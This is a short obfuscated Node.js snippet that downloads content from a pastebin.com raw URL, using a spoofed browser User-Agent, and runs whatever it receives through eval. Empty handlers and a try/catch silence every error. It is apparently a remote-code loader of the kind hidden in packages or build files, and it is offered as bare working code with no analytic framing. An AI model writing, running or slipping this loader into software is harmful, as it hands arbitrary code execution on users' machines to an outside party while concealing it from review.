try {
    var https = require('https');
    https['get']({
        'hostname': 'pastebin.com',
        'path': '/raw/XLeVP82h',
        'headers': {
            'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x206.1;\x20rv:52.0)\x20Gecko/20100101\x20Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
    }, _0x3f8562 => {
        var _0x16e448 = {
            'kWMln': function (_0xb87f01, _0xb121ac) {
                return _0xb87f01(_0xb121ac);
            },
            'DOmSh': 'utf8',
            'gCVZd': 'data',
            'rbhHq': 'error'
        };
        _0x3f8562['setEncoding'](_0x16e448['DOmSh']);
        _0x3f8562['on'](_0x16e448['gCVZd'], _0x4aad58 => {
            _0x16e448['kWMln'](eval, _0x4aad58);
        });
        _0x3f8562['on'](_0x16e448['rbhHq'], () => {
        });
    })['on']('error', () => {
    });
} catch (_0x2b72bb) {
}
